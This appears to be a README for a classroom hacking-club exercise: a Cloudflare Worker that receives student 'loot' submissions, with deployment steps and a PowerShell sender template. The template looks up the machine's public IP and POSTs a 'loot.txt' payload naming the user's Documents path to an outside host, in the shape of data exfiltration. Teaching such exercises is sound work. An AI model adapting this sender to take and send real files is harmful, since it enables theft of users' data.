# The No Grip Elite Hackery Society

This project runs as a free Cloudflare Worker for the No Grip Elite Hackery Society signal intake.

## Three live URLs

- Landing page / instructions: https://n.0g.rip/
- Student POST endpoint: https://n.0g.rip/
- Dashboard: https://n.0g.rip/dashboard

The root domain is intentionally the POST target because it is the simplest endpoint for students to send to during class.

## Required POST payload

The app will reject any request that does not include all of the following fields:

- student_id
- hacker_handle
- filename
- public_ip
- data

Example payload:

```json
{
  "student_id": "STU-001",
  "hacker_handle": "neo",
  "filename": "loot.txt",
  "public_ip": "203.0.113.15",
  "data": "C:\\Users\\student\\Documents\\*.txt"
}
```

## Cloudflare deployment

1. Sign in to Cloudflare and create a Worker.
2. In this project folder, run:

```bash
npm install
npx wrangler login
npx wrangler deploy
```

3. Configure the worker custom domain to point to https://n.0g.rip.
4. Share the three URLs above with the class.

## Local development

```bash
npm install
npm run dev
```

Then test payloads against:

```text
http://localhost:8787/
```

## Student-friendly sender example

Use the provided [test-listener.ps1](test-listener.ps1) as a template and point it at the root domain.

```powershell
$serviceUrl = "https://n.0g.rip/"
$publicIp = (Invoke-RestMethod -Uri "https://api.ipify.org").Trim()

$payload = @{
    student_id = "STU-001"
    hacker_handle = "neo"
    filename = "loot.txt"
    public_ip = $publicIp
    data = "C:\Users\$env:USERNAME\Documents\*.txt"
}

Invoke-RestMethod -Uri $serviceUrl -Method POST -Body ($payload | ConvertTo-Json -Compress) -ContentType "application/json"
```

## Validation

```bash
npm test
```

